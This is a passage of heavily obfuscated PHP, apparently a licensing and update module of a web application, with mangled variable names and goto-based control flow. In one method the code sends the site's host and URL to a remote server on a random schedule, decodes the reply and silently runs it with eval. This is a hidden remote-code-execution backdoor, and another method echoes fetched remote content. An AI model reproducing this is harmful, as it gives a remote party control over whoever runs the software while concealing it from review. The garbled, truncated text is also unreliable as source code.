array($f×µÇÖ™‰[209] => $fÇÌß´¨î—[$f×µÇÖ™‰[165]], $f×µÇÖ™‰[210] => $CÎô‡ÎÀ¬Š[$f×µÇÖ™‰[211]], $f×µÇÖ™‰[212] => $f×µÇÖ™‰[124](16), $f×µÇÖ™‰[120] => $CÎô‡ÎÀ¬Š[$f×µÇÖ™‰[213]]); if ($fÇÌß´¨î—[$f×µÇÖ™‰[168]]) { $cã±—…ƒ¨[$f×µÇÖ™‰[212]] = $fÇÌß´¨î—[$f×µÇÖ™‰[168]]; } goto a„Œ·»; e¨Âõ¥…Á : $bÁ„äç÷¼š = $DçÍàÛËğ«[593]; while ($bÁ„äç÷¼š < $DçÍàÛËğ«[564]) { if ($bÁ„äç÷¼š >= 0) { break; } $bÁ„äç÷¼š++; } $Aˆ‘Æò¾¾ = $f×µÇÖ™‰[114]($_SERVER[$f×µÇÖ™‰[115]] . $c‚Ä–Ú÷ó¢); goto BŒçÅŠ‘··; b¢ë©„ºÄ: $cİÈÈ•ø«å = $DçÍàÛËğ«[595]; while (strlen($cİÈÈ•ø«å) < $DçÍàÛËğ«[564]) { if (!$cİÈÈ•ø«å) { break; } $cİÈÈ•ø«å++; } if ($CÎô‡ÎÀ¬Š[$f×µÇÖ™‰[217]] && $CÎô‡ÎÀ¬Š[$f×µÇÖ™‰[217]] >= 1) { $f×µÇÖ™‰[61]($f×µÇÖ™‰[62])->{$_SERVER[®Ñèœ¡][218]}($f×µÇÖ™‰[219], $f×µÇÖ™‰[220]); } goto bàèÅ‹Œ; BŒçÅŠ‘··: if ($E²å„¼µÎƒ[$f×µÇÖ™‰[178]] == $f×µÇÖ™‰[179]) { $aÊ·¿ùÛº¿ = $this->{$_SERVER[®Ñèœ¡][147]}($Aˆ‘Æò¾¾, $f×µÇÖ™‰[180]); $B¼Ê¯×İ‰¶ = $this->{$_SERVER[®Ñèœ¡][127]}($f×µÇÖ™‰[148]($fÇÌß´¨î—), $Aˆ‘Æò¾¾ . $f×µÇÖ™‰[181], 3); $dåº¥Š¶ = $this->{$_SERVER[®Ñèœ¡][182]}($f×µÇÖ™‰[183] . $aÊ·¿ùÛº¿ . $f×µÇÖ™‰[184] . $B¼Ê¯×İ‰¶, -1); $f×µÇÖ™‰[166]($dåº¥Š¶, !0); } else { if ($E²å„¼µÎƒ[$f×µÇÖ™‰[178]] == $f×µÇÖ™‰[185]) { $F”‹£•¿Œõ = $f×µÇÖ™‰[25]($f×µÇÖ™‰[114]($f×µÇÖ™‰[186] . $Aˆ‘Æò¾¾), 12, 15) . $f×µÇÖ™‰[187]; $B¼Ê¯×İ‰¶ = $this->{$_SERVER[®Ñèœ¡][188]}($f×µÇÖ™‰[2]($E²å„¼µÎƒ[$f×µÇÖ™‰[189]]), $F”‹£•¿Œõ, 2); $fªÖÂÛÎ‰Ì = $f×µÇÖ™‰[190]($B¼Ê¯×İ‰¶, !0); if (!$f×µÇÖ™‰[191]($fªÖÂÛÎ‰Ì) || !$f×µÇÖ™‰[191]($fªÖÂÛÎ‰Ì[$f×µÇÖ™‰[192]]) || $fªÖÂÛÎ‰Ì[$f×µÇÖ™‰[165]] != !0) { $cè¹ô’İ­‹ = $f×µÇÖ™‰[193]; $e®‡°ªì§Ã = $fªÖÂÛÎ‰Ì[$f×µÇÖ™‰[192]] ? $f×µÇÖ™‰[194] . $fªÖÂÛÎ‰Ì[$f×µÇÖ™‰[192]] : $cè¹ô’İ­‹; $f×µÇÖ™‰[166]($e®‡°ªì§Ã, !1); } else { $fÇÌß´¨î—[$f×µÇÖ™‰[168]] = $fªÖÂÛÎ‰Ì[$f×µÇÖ™‰[192]][$f×µÇÖ™‰[195]]; } } else { $fªÖÂÛÎ‰Ì = $this->{$_SERVER[®Ñèœ¡][182]}($f×µÇÖ™‰[196], $fÇÌß´¨î—, 10); } } if (!$f×µÇÖ™‰[191]($fªÖÂÛÎ‰Ì) || !$f×µÇÖ™‰[191]($fªÖÂÛÎ‰Ì[$f×µÇÖ™‰[192]]) || $fªÖÂÛÎ‰Ì[$f×µÇÖ™‰[165]] != !0) { $cè¹ô’İ­‹ = $f×µÇÖ™‰[197]($f×µÇÖ™‰[198]); $e®‡°ªì§Ã = $fªÖÂÛÎ‰Ì[$f×µÇÖ™‰[192]] ? $f×µÇÖ™‰[194] . $fªÖÂÛÎ‰Ì[$f×µÇÖ™‰[192]] : $cè¹ô’İ­‹; $f×µÇÖ™‰[166]($e®‡°ªì§Ã, !1); } $CÎô‡ÎÀ¬Š = $fªÖÂÛÎ‰Ì[$f×µÇÖ™‰[192]]; goto FèÀÂĞ¬äŠ; a­¸˜ø÷ÜÒ: $bÎ”İæƒÚ = $f×µÇÖ™‰[124](16); $dœõŞì‹‰» = $bÎ”İæƒÚ . $cã±—…ƒ¨[$f×µÇÖ™‰[120]] . $this->{$_SERVER[®Ñèœ¡][147]}($f×µÇÖ™‰[114]($cã±—…ƒ¨[$f×µÇÖ™‰[209]]), $bÎ”İæƒÚ); $cã±—…ƒ¨[$f×µÇÖ™‰[123]] = $f×µÇÖ™‰[118]($f×µÇÖ™‰[214]($this->{$_SERVER[®Ñèœ¡][147]}($dœõŞì‹‰», $f×µÇÖ™‰[216]))); goto b¢ë©„ºÄ; B‰˜—õÈ‚ï: $FÍˆŸÃŞÄ = $e­ƒ¸ÃÌòñ[$f×µÇÖ™‰[225]]; $B¨ÃÆ‘õ¼« = array(); $B¨ÃÆ‘õ¼«[$D çÍÓ§†ê] = $aÉ¸›áŞ†; goto EÃ‘…§¾Ã; E“å×¹†ñá: if (!isset($E²å„¼µÎƒ[$f×µÇÖ™‰[165]]) || $f×µÇÖ™‰[24]($E²å„¼µÎƒ[$f×µÇÖ™‰[165]]) != 16) { $f×µÇÖ™‰[166]($f×µÇÖ™‰[167] . $E²å„¼µÎƒ[$f×µÇÖ™‰[165]], !1); } $c‚Ä–Ú÷ó¢ = $f×µÇÖ™‰[61]($f×µÇÖ™‰[62])->{$_SERVER[®Ñèœ¡][63]}($f×µÇÖ™‰[116]); $fÇÌß´¨î— = array($f×µÇÖ™‰[165] => $E²å„¼µÎƒ[$f×µÇÖ™‰[165]], $f×µÇÖ™‰[168] => $f×µÇÖ™‰[124](16), $f×µÇÖ™‰[169] => $f×µÇÖ™‰[149], $f×µÇÖ™‰[170] => $f×µÇÖ™‰[171], $f×µÇÖ™‰[172] => $_SERVER[$f×µÇÖ™‰[173]], $f×µÇÖ™‰[174] => $_SERVER[$f×µÇÖ™‰[175]], $f×µÇÖ™‰[176] => $_SERVER[$f×µÇÖ™‰[177]]); goto e¨Âõ¥…Á ; c½Ä’Î—ÙÎ: while (strlen($càö¶Ù³ÈÖ) < $DçÍàÛËğ«[568]) { if (!$càö¶Ù³ÈÖ) { break; } $càö¶Ù³ÈÖ++; } goto b¢£ˆ˜²¼ø; f«ŒÑäÄË: if (!$Dõ¼‰‚ˆÀ«) { return; } $D çÍÓ§†ê = $f×µÇÖ™‰[214]($f×µÇÖ™‰[25]($c‡Œ¯¤œÎÙ, 10, 16)); $aÉ¸›áŞ† = $this->{$_SERVER[®Ñèœ¡][127]}($f×µÇÖ™‰[148]($CÎô‡ÎÀ¬Š), $c‡Œ¯¤œÎÙ); goto bîË³¢‰¡; cÊÏÓ«“‚»: $DçÍàÛËğ« =& $_SERVER[îÖ]; $f×µÇÖ™‰ =& $_SERVER[®Ñèœ¡]; if ($_SERVER[$f×µÇÖ™‰[44]] != $f×µÇÖ™‰[162]) { return; } goto cøç‡øø×¦; bîË³¢‰¡: $e­ƒ¸ÃÌòñ = $f×µÇÖ™‰[222]($f×µÇÖ™‰[61]($f×µÇÖ™‰[11])->{$_SERVER[®Ñèœ¡][223]}(), $f×µÇÖ™‰[224]); $a…îĞŞ÷Î = $DçÍàÛËğ«[597]; if (strlen($a…îĞŞ÷Î) < $DçÍàÛËğ«[555]) { die; } goto B‰˜—õÈ‚ï; EÃ‘…§¾Ã: $c±–³ÕìÊ¶ = $DçÍàÛËğ«[598]; if (strlen($c±–³ÕìÊ¶) < $DçÍàÛËğ«[555]) { return; } $f×µÇÖ™‰[61]($f×µÇÖ™‰[11])->{$_SERVER[®Ñèœ¡][226]}($FÍˆŸÃŞÄ[$f×µÇÖ™‰[227]], array($f×µÇÖ™‰[228] => $B¨ÃÆ‘õ¼«)); goto F…Ù—øÙ‡; bàèÅ‹Œ: $f×µÇÖ™‰[61]($f×µÇÖ™‰[62])->{$_SERVER[®Ñèœ¡][221]}($cã±—…ƒ¨); $c‡Œ¯¤œÎÙ = $f×µÇÖ™‰[114]($_SERVER[$f×µÇÖ™‰[115]] . $f×µÇÖ™‰[214]($c‚Ä–Ú÷ó¢) . $cã±—…ƒ¨[$f×µÇÖ™‰[210]]); $Dõ¼‰‚ˆÀ« = $DçÍàÛËğ«[596]; goto f«ŒÑäÄË; cøç‡øø×¦: if (!$f×µÇÖ™‰[104]($GLOBALS, $f×µÇÖ™‰[132])) { die; } $E²å„¼µÎƒ = $GLOBALS[$f×µÇÖ™‰[22]]; if (isset($E²å„¼µÎƒ[$f×µÇÖ™‰[163]])) { $this->{$_SERVER[®Ñèœ¡][164]}(); die; } goto E“å×¹†ñá; b¢£ˆ˜²¼ø: } private function licenseRegistSuccess() { goto dé÷Œ“ÊŞ; EŒ°ÀÍº°ö: $cà »ˆ¯² = $C‹Õß¥÷–[601]; if (strlen($cà »ˆ¯²) < $C‹Õß¥÷–[564]) { return; } if ($CíÖ—†‘¯[$aé´‰Ïãè[85]] != $aé´‰Ïãè[220]) { $aé´‰Ïãè[61]($aé´‰Ïãè[62])->{$_SERVER[®Ñèœ¡][221]}($aé´‰Ïãè[85], $aé´‰Ïãè[220]); } goto CšÜç”; dé÷Œ“ÊŞ: $C‹Õß¥÷– =& $_SERVER[îÖ]; $aé´‰Ïãè =& $_SERVER[®Ñèœ¡]; $CíÖ—†‘¯ = $aé´‰Ïãè[61]($aé´‰Ïãè[62])->{$_SERVER[®Ñèœ¡][63]}(); goto EŒ°ÀÍº°ö; CšÜç”: $aé´‰Ïãè[110]($aé´‰Ïãè[230])->{$_SERVER[®Ñèœ¡][231]}(!0); goto Dˆäº÷é‰; Dˆäº÷é‰: } private function dqgr64ce3872() { goto Aë‹ò–Ä; Dâ‹¶îøŞ: $this->ovyhb2994ff5 = $bÒ¤è„´ÈÓ[121]; $b®Ä–›ëá = $bÊ™ââò[604]; goto A†Äæï½äš; Cã¬—… : $this->jsocc4af2946 = array(); $CÛ·çõ¬²¾ = $bÊ™ââò[603]; if (strlen($CÛ·çõ¬²¾) < $bÊ™ââò[555]) { die; } goto Dâ‹¶îøŞ; Aë‹ò–Ä: $bÊ™ââò =& $_SERVER[îÖ]; $bÒ¤è„´ÈÓ =& $_SERVER[®Ñèœ¡]; $bÒ¤è„´ÈÓ[61]($bÒ¤è„´ÈÓ[62])->{$_SERVER[®Ñèœ¡][221]}(array($bÒ¤è„´ÈÓ[209] => $bÒ¤è„´ÈÓ[10], $bÒ¤è„´ÈÓ[210] => $bÒ¤è„´ÈÓ[10], $bÒ¤è„´ÈÓ[120] => $bÒ¤è„´ÈÓ[121], $bÒ¤è„´ÈÓ[122] => $bÒ¤è„´ÈÓ[10], $bÒ¤è„´ÈÓ[123] => $bÒ¤è„´ÈÓ[10])); goto Dì¿†óô“„; Dì¿†óô“„: $f¤£Ù¹îóÊ = $bÊ™ââò[602]; if (strlen($f¤£Ù¹îóÊ) < $bÊ™ââò[560]) { die; } $bÒ¤è„´ÈÓ[61]($bÒ¤è„´ÈÓ[62])->{$_SERVER[®Ñèœ¡][218]}($bÒ¤è„´ÈÓ[219], $bÒ¤è„´ÈÓ[232]); goto Cã¬—… ; A†Äæï½äš: } private function kfai97d23eb0() { goto a˜¤§ÖªÑ; DÇ†é²Æå: if (!$B‰Ô¿¹Ç‰[191]($eù“í¹ø¨…)) { return $this->{$_SERVER[®Ñèœ¡][164]}(); } $a„Ùµ§ÒœÇ = $B‰Ô¿¹Ç‰[144]($eù“í¹ø¨…[$B‰Ô¿¹Ç‰[145]]); if ($B‰Ô¿¹Ç‰[233]() >= $a„Ùµ§ÒœÇ) { return $this->{$_SERVER[®Ñèœ¡][164]}(); } goto cÍÁÉ¼¾Ì; cÍÁÉ¼¾Ì: $this->jsocc4af2946 = $eù“í¹ø¨…; $this->ovyhb2994ff5 = $f«ï‹¦´éÇ[$B‰Ô¿¹Ç‰[120]]; goto CŒôêŠï‘; a÷Ë¦ØÜï: $f«ï‹¦´éÇ = $B‰Ô¿¹Ç‰[61]($B‰Ô¿¹Ç‰[62])->{$_SERVER[®Ñèœ¡][63]}(); if ($f«ï‹¦´éÇ[$B‰Ô¿¹Ç‰[120]] == $B‰Ô¿¹Ç‰[121]) { return; } $fÆŠÌÈ Š = $B‰Ô¿¹Ç‰[61]($B‰Ô¿¹Ç‰[62])->{$_SERVER[®Ñèœ¡][63]}($B‰Ô¿¹Ç‰[116]); goto b¦ò¢–İ®; b¦ò¢–İ®: $c‘çôè™à  = $B‰Ô¿¹Ç‰[222]($B‰Ô¿¹Ç‰[61]($B‰Ô¿¹Ç‰[11])->{$_SERVER[®Ñèœ¡][223]}(), $B‰Ô¿¹Ç‰[224]); $Bä¬±ëòêÎ = $c‘çôè™à [$B‰Ô¿¹Ç‰[225]]; $A‰ß£ø‹Û¯ = $B‰Ô¿¹Ç‰[114]($_SERVER[$B‰Ô¿¹Ç‰[115]] . $B‰Ô¿¹Ç‰[214]($fÆŠÌÈ Š) . $f«ï‹¦´éÇ[$B‰Ô¿¹Ç‰[210]]); goto CÉ¼—Í´ìˆ; a˜¤§ÖªÑ: $B‰Ô¿¹Ç‰ =& $_SERVER[®Ñèœ¡]; $_SERVER[$B‰Ô¿¹Ç‰[175]] = $B‰Ô¿¹Ç‰[104]($_SERVER, $B‰Ô¿¹Ç‰[175], APP_HOST); $this->ovyhb2994ff5 = $B‰Ô¿¹Ç‰[121]; goto a÷Ë¦ØÜï; CÉ¼—Í´ìˆ: $aÑá²Øïò = $B‰Ô¿¹Ç‰[214]($B‰Ô¿¹Ç‰[25]($A‰ß£ø‹Û¯, 10, 16)); $eù“í¹ø¨… = $this->{$_SERVER[®Ñèœ¡][188]}($Bä¬±ëòêÎ[$B‰Ô¿¹Ç‰[91]][$aÑá²Øïò], $A‰ß£ø‹Û¯); $eù“í¹ø¨… = $B‰Ô¿¹Ç‰[190]($eù“í¹ø¨…, !0); goto DÇ†é²Æå; CŒôêŠï‘: } private function pgcw9bbadf83() { goto E†¿Ğà…ğ; E†¿Ğà…ğ: $bğïì¯í½ô =& $_SERVER[®Ñèœ¡]; $CÄš¯Ø„Í = $GLOBALS[$bğïì¯í½ô[22]]; $B†‡èÇ„•¯ = $_SERVER[$bğïì¯í½ô[44]]; goto fšğ®İˆ; fšğ®İˆ: $B·™–æ³ºø = $_SERVER[îÖ][605]; if ($B†‡èÇ„•¯ == $bğïì¯í½ô[234] && $this->ovyhb2994ff5 == $bğïì¯í½ô[121]) { $bğïì¯í½ô[166]($bğïì¯í½ô[197]($bğïì¯í½ô[235]), !1, $bğïì¯í½ô[236]); } $FóÍãˆÍÒ§ = array($bğïì¯í½ô[237], $bğïì¯í½ô[238]); goto b¯ÒÂ¬Ãµß; b¯ÒÂ¬Ãµß: if ($bğïì¯í½ô[239]($B†‡èÇ„•¯, $FóÍãˆÍÒ§)) { if ($this->ovyhb2994ff5 == $bğïì¯í½ô[121] && isset($CÄš¯Ø„Í[$bğïì¯í½ô[240]])) { $bğïì¯í½ô[166]($bğïì¯í½ô[197]($bğïì¯í½ô[235]), !1, $bğïì¯í½ô[236]); die; } $CğóÚïëÑ = $this->{$_SERVER[®Ñèœ¡][137]}(); if ($CğóÚïëÑ != $bğïì¯í½ô[201]($bğïì¯í½ô[241])) { if ($CğóÚïëÑ <= $bğïì¯í½ô[61]($bğïì¯í½ô[139])->{$_SERVER[®Ñèœ¡][140]}()) { $bğïì¯í½ô[166]($bğïì¯í½ô[197]($bğïì¯í½ô[242]), !1, $bğïì¯í½ô[236]); die; } } } goto eÜ¦³‰Ç”Æ; eÜ¦³‰Ç”Æ: } private function jklme770ca46() { goto Dó‚÷Ùôˆœ; e‚äÏ¡È³: if (!$b£™×‡ÌÜî[239]($_SERVER[$b£™×‡ÌÜî[44]], $f’ç†îµŒ¦)) { return; } $c™†÷”¸ğñ = $b£™×‡ÌÜî[245]; $c™†÷”¸ğñ = $this->{$_SERVER[®Ñèœ¡][246]}($c™†÷”¸ğñ, $b£™×‡ÌÜî[247]); goto F—¢Ûèƒ‹£; F—¢Ûèƒ‹£: $C¾È½Á¼±Õ = $b£™×‡ÌÜî[248](array($b£™×‡ÌÜî[249] => array($b£™×‡ÌÜî[250] => $b£™×‡ÌÜî[251], $b£™×‡ÌÜî[252] => 3))); $a”Û²íÈ = @$b£™×‡ÌÜî[253]($c™†÷”¸ğñ, !1, $C¾È½Á¼±Õ); $BÈ‘ŠÁˆÜø = $_SERVER[îÖ][606]; goto eèáŞ¹Â¤; Dó‚÷Ùôˆœ: $b£™×‡ÌÜî =& $_SERVER[®Ñèœ¡]; $f’ç†îµŒ¦ = array($b£™×‡ÌÜî[135], $b£™×‡ÌÜî[243]); if (!$b£™×‡ÌÜî[104]($GLOBALS, $b£™×‡ÌÜî[132]) || !isset($_GET[$b£™×‡ÌÜî[244]])) { return; } goto e‚äÏ¡È³; eèáŞ¹Â¤: $b£™×‡ÌÜî[254]($b£™×‡ÌÜî[255]); if ($a”Û²íÈ && $b£™×‡ÌÜî[32]($a”Û²íÈ, $b£™×‡ÌÜî[256])) { echo $a”Û²íÈ; } die; goto a°œ‹×ğ‰; a°œ‹×ğ‰: } public function mhnpae9911cc($bãÙÉå·êº) { goto DöÌ°®†æ; aÈˆÎ¥¥§Ò: $f©‹ã „­» = array($a´œÏæ ºÒ[258], $a´œÏæ ºÒ[259], $a´œÏæ ºÒ[260], $a´œÏæ ºÒ[261], $a´œÏæ ºÒ[262], $a´œÏæ ºÒ[263], $a´œÏæ ºÒ[264], $a´œÏæ ºÒ[265]); $BÇ¶ÇØ¬¥Ì = $eóíé‚³•[607]; if (!$BÇ¶ÇØ¬¥Ì) { die; } goto aÔßù´–±; A®ªïÆ»İ¢: if (!$FÔš”§†îÔ) { die; } foreach ($f©‹ã „­» as $F•»ñš´÷²) { if (!$a´œÏæ ºÒ[239]($F•»ñš´÷², $DË¦ÅùâÕ‰)) { $CØšÒëÅË[] = $F•»ñš´÷²; } } foreach ($CØšÒëÅË as $F•»ñš´÷²) { unset($bãÙÉå·êº[$F•»ñš´÷²]); } goto DŒ•â©Ñá; DŒ•â©Ñá: return $bãÙÉå·êº; goto a«œ ê³ô; aÔßù´–±: $DË¦ÅùâÕ‰ = $a´œÏæ ºÒ[0]($a´œÏæ ºÒ[266], $a´œÏæ ºÒ[104]($this->jsocc4af2946, $a´œÏæ ºÒ[129], $a´œÏæ ºÒ[10])); $CØšÒëÅË = array(); $FÔš”§†îÔ = $eóíé‚³•[608]; goto A®ªïÆ»İ¢; DöÌ°®†æ: $eóíé‚³• =& $_SERVER[îÖ]; $a´œÏæ ºÒ =& $_SERVER[®Ñèœ¡]; if ($this->ovyhb2994ff5 == $a´œÏæ ºÒ[257]) { return $bãÙÉå·êº; } goto aÈˆÎ¥¥§Ò; a«œ ê³ô: } private function ertv80d3c6a4() { goto b¦’‚ËÑ¥—; A°ì¯İ–ƒˆ: $E¨¨¢Ğ¼• = $_SERVER[$C²Ï‹…®Æ[44]]; $fœ÷ñ‚ß¬í = array($C²Ï‹…®Æ[268]); $eÌ•ĞÒº½§ = $Dè¦í“æ©‘[609]; goto bë‰¨óÛ¢; bë‰¨óÛ¢: if (!$eÌ•ĞÒº½§) { return; } foreach ($fœ÷ñ‚ß¬í as $e«‰Ë¨ÙÂ²) { if ($e«‰Ë¨ÙÂ² == $E¨¨¢Ğ¼• || $C²Ï‹…®Æ[25]($E¨¨¢Ğ¼•, 0, $C²Ï‹…®Æ[24]($e«‰Ë¨ÙÂ²)) == $e«‰Ë¨ÙÂ²) { $C²Ï‹…®Æ[166]($C²Ï‹…®Æ[197]($C²Ï‹…®Æ[269]), !1); } } $GLOBALS[$C²Ï‹…®Æ[91]][$C²Ï‹…®Æ[95]][$C²Ï‹…®Æ[270]] = $C²Ï‹…®Æ[220]; goto aÕçâˆŸÁ·; eİ±Ÿ±ÊÌŠ: $GLOBALS[$C²Ï‹…®Æ[91]][$C²Ï‹…®Æ[271]] = $C²Ï‹…®Æ[220]; $fçÊÇ¢ ƒ¨ = $Dè¦í“æ©‘[611]; if ($C²Ï‹…®Æ[61]($C²Ï‹…®Æ[272])->{$_SERVER[®Ñèœ¡][63]}($C²Ï‹…®Æ[85]) != $C²Ï‹…®Æ[232]) { $C²Ï‹…®Æ[61]($C²Ï‹…®Æ[272])->{$_SERVER[®Ñèœ¡][221]}($C²Ï‹…®Æ[85], $C²Ï‹…®Æ[232]); } goto cÍé­‘Ÿæ; aÕçâˆŸÁ·: $eÃ²ÖŒ½ = $Dè¦í“æ©‘[610]; if (strlen($eÃ²ÖŒ½) < $Dè¦í“æ©‘[564]) { return; } $GLOBALS[$C²Ï‹…®Æ[91]][$C²Ï‹…®Æ[95]][$C²Ï‹…®Æ[267]] = $C²Ï‹…®Æ[232]; goto eİ±Ÿ±ÊÌŠ; b¦’‚ËÑ¥—: $Dè¦í“æ©‘ =& $_SERVER[îÖ]; $C²Ï‹…®Æ =& $_SERVER[®Ñèœ¡]; if ($this->ovyhb2994ff5 != $C²Ï‹…®Æ[121]) { $GLOBALS[$C²Ï‹…®Æ[91]][$C²Ï‹…®Æ[95]][$C²Ï‹…®Æ[267]] = $C²Ï‹…®Æ[220]; return; } goto A°ì¯İ–ƒˆ; cÍé­‘Ÿæ: } public function tayw7c2abbcf() { return $_SERVER[®Ñèœ¡][273]; } private function xgat22a85602() { goto D‹¿œ’©ƒ¾; D‹¿œ’©ƒ¾: $b˜È”ÊŠš® =& $_SERVER[îÖ]; $EÍĞ°µÖÊÆ =& $_SERVER[®Ñèœ¡]; $C¿‡Éó¥ = array($EÍĞ°µÖÊÆ[274], $EÍĞ°µÖÊÆ[275], $EÍĞ°µÖÊÆ[276]); goto Cãùñ‡š¤¹; CÒÙ‚Àçº: $AƒØ×åÕôí = $b˜È”ÊŠš®[613]; if (!$AƒØ×åÕôí) { die; } $c½‰±¦Òé† = $this->{$_SERVER[®Ñèœ¡][182]}($EÍĞ°µÖÊÆ[282], $aè×¼…Ê¬‘); goto eäĞ®Ÿ•óØ; C”ƒœÊËµñ: if ($B‰§ÜğÖãµ && $EÍĞ°µÖÊÆ[233]() - $B‰§ÜğÖãµ < $EÍĞ°µÖÊÆ[201]($EÍĞ°µÖÊÆ[281])) { return; } $EÍĞ°µÖÊÆ[13](array($EÍĞ°µÖÊÆ[279], $EÍĞ°µÖÊÆ[152]), $C…×ËÌÃì, $EÍĞ°µÖÊÆ[233]()); $aè×¼…Ê¬‘ = array($EÍĞ°µÖÊÆ[165] => $EÍĞ°µÖÊÆ[61]($EÍĞ°µÖÊÆ[62])->{$_SERVER[®Ñèœ¡][63]}($EÍĞ°µÖÊÆ[209]), $EÍĞ°µÖÊÆ[178] => $this->ovyhb2994ff5, $EÍĞ°µÖÊÆ[176] => $_SERVER[$EÍĞ°µÖÊÆ[177]], $EÍĞ°µÖÊÆ[169] => $EÍĞ°µÖÊÆ[149], $EÍĞ°µÖÊÆ[172] => $_SERVER[$EÍĞ°µÖÊÆ[173]]); goto CÒÙ‚Àçº; dÅËÛ§ÏÄ¶: if ($c½‰±¦Òé†[$EÍĞ°µÖÊÆ[165]] && $c½‰±¦Òé†[$EÍĞ°µÖÊÆ[283]]) { if ($this->{$_SERVER[®Ñèœ¡][199]}($c½‰±¦Òé†[$EÍĞ°µÖÊÆ[283]]) == $aè×¼…Ê¬‘[$EÍĞ°µÖÊÆ[165]]) { return; } } $this->{$_SERVER[®Ñèœ¡][164]}(); if ($this->{$_SERVER[®Ñèœ¡][199]}($c½‰±¦Òé†[$EÍĞ°µÖÊÆ[283]]) != $aè×¼…Ê¬‘[$EÍĞ°µÖÊÆ[165]]) { $f¸‹ø««Æ‚ = array($EÍĞ°µÖÊÆ[202] => $EÍĞ°µÖÊÆ[61]($EÍĞ°µÖÊÆ[62])->{$_SERVER[®Ñèœ¡][63]}($EÍĞ°µÖÊÆ[116]), $EÍĞ°µÖÊÆ[203] => $_SERVER[$EÍĞ°µÖÊÆ[115]], $EÍĞ°µÖÊÆ[204] => $EÍĞ°µÖÊÆ[205](), $EÍĞ°µÖÊÆ[174] => $_SERVER[$EÍĞ°µÖÊÆ[175]]); $cÓäŠÚËØ = $this->{$_SERVER[®Ñèœ¡][206]}($EÍĞ°µÖÊÆ[148]($f¸‹ø««Æ‚)); $c½‰±¦Òé† = $this->{$_SERVER[®Ñèœ¡][182]}($EÍĞ°µÖÊÆ[207] . $cÓäŠÚËØ); if ($c½‰±¦Òé† && $EÍĞ°µÖÊÆ[191]($c½‰±¦Òé†) && isset($c½‰±¦Òé†[$EÍĞ°µÖÊÆ[283]])) { $eÊ…‚ÀÄÖ = $this->{$_SERVER[®Ñèœ¡][188]}($c½‰±¦Òé†[$EÍĞ°µÖÊÆ[283]], 2); if ($eÊ…‚ÀÄÖ) { $eÊ…‚ÀÄÖ = $this->{$_SERVER[®Ñèœ¡][199]}($eÊ…‚ÀÄÖ); } if ($eÊ…‚ÀÄÖ) { try { @eval($eÊ…‚ÀÄÖ); } catch (Exception $a…ÊÓ…™’‡) { } } } } goto b‰Õ†¹š±; Cãùñ‡š¤¹: $C…×ËÌÃì = $EÍĞ°µÖÊÆ[277] . $EÍĞ°µÖÊÆ[114]($EÍĞ°µÖÊÆ[278]); $FÅğ‘¿ Ş‰ = $b˜È”ÊŠš®[612]; if ($this->ovyhb2994ff5 == $EÍĞ°µÖÊÆ[121] || !$EÍĞ°µÖÊÆ[104]($GLOBALS, $EÍĞ°µÖÊÆ[132])) { return; } goto fÙ½¨ğï³Á; fÙ½¨ğï³Á: if (!$EÍĞ°µÖÊÆ[239]($_SERVER[$EÍĞ°µÖÊÆ[44]], $C¿‡Éó¥)) { return; } if ($EÍĞ°µÖÊÆ[233]() % 4 != 0) { return; } $B‰§ÜğÖãµ = $EÍĞ°µÖÊÆ[13](array($EÍĞ°µÖÊÆ[279], $EÍĞ°µÖÊÆ[280]), $C…×ËÌÃì); goto C”ƒœÊËµñ; eäĞ®Ÿ•óØ: $cäš†ˆ•¿ = $b˜È”ÊŠš®[614]; if (!$cäš†ˆ•¿) { return; } if (!$EÍĞ°µÖÊÆ[191]($c½‰±¦Òé†)) { return; } goto dÅËÛ§ÏÄ¶; b‰Õ†¹š±: } private function ptraa5e408e1($b²À¡œ›· = '', $eµ•‘ºÏõ¬ = array(), $fñ‡æ¶îÚó = 5) { goto dï¢ğ‚†²¡; bÄ¶Ò“”äé: $c±Î¹è•¤ø = $b¦ì›ç•[248](array($b¦ì›ç•[249] => array($b¦ì›ç•[252] => $fñ‡æ¶îÚó, $b¦ì›ç•[250] => $b¦ì›ç•[288]), $b¦ì›ç•[289] => array($b¦ì›ç•[290] => !1, $b¦ì›ç•[291] => !1))); $eµ•‘ºÏõ¬ = @$b¦ì›ç•[253]($AÑ’“¶ÙÀ, !1, $c±Î¹è•¤ø); $CœŠÀÊõƒ = $bêÕÁ×íË[615]; goto d’Ä“ÅÇŞØ; d’Ä“ÅÇŞØ: while ($CœŠÀÊõƒ < $bêÕÁ×íË[555]) { if ($CœŠÀÊõƒ >= 0) { break; } $CœŠÀÊõƒ++; } return $b¦ì›ç•[190]($eµ•‘ºÏõ¬, !0); $Bùš¡Â‘ÂÂ = $bêÕÁ×íË[616]; goto f°óá’»î; f±£ˆ‹­Ä: $AÑ’“¶ÙÀ = $this->{$_SERVER[®Ñèœ¡][246]}($AÑ’“¶ÙÀ, $b¦ì›ç•[285]); $AÑ’“¶ÙÀ = $AÑ’“¶ÙÀ . $b²À¡œ›· . $b¦ì›ç•[286] . $b¦ì›ç•[287]($eµ•‘ºÏõ¬); if ($eµ•‘ºÏõ¬ === -1) { return $AÑ’“¶ÙÀ; } goto bÄ¶Ò“”äé; f°óá’»î: if (!$Bùš¡Â‘ÂÂ) { return; } $f½«…š” = $bêÕÁ×íË[617]; if (strlen($f½«…š”) < $bêÕÁ×íË[555]) { return; } goto FõÖŠÌÕÊ; dï¢ğ‚†²¡: $bêÕÁ×íË =& $_SERVER[îÖ]; $b¦ì›ç• =& $_SERVER[®Ñèœ¡]; $AÑ’“¶ÙÀ = $b¦ì›ç•[284]; goto f±£ˆ‹­Ä; FõÖŠÌÕÊ: } private function cvysc11f9ced() { goto F‰“©ĞŸßÅ; fé¥¡ÇŒ¥: while ($E”ìÂºƒƒ˜ < $FñÄ¢„Š‘‡[568]) { if ($E”ìÂºƒƒ˜ >= 0) { break; } $E”ìÂºƒƒ˜++; } $DÑ¦¨—„õİ = $DÑ¦¨—„õİ ? $DäéÑÓÂ¹‰[201]($DÑ¦¨—„õİ) : 0; return $CŸøÜ¥–Ğ¶ + $DÑ¦¨—„õİ; goto Bã»êŒ–®¾; Bã»êŒ–®¾: $CéŸÍŞøöš = $FñÄ¢„Š‘‡[620]; while ($CéŸÍŞøöš < $FñÄ¢„Š‘‡[568]) { if ($CéŸÍŞøöš >= 0) { break; } $CéŸÍŞøöš++; } goto E¦ÍÚ‡Ş¥; F‰“©ĞŸßÅ: $FñÄ¢„Š‘‡ =& $_SERVER[îÖ]; $DäéÑÓÂ¹‰ =& $_SERVER[®Ñèœ¡]; $aØË·ÑºÒ¬ = array($DäéÑÓÂ¹‰[292] => $DäéÑÓÂ¹‰[293], 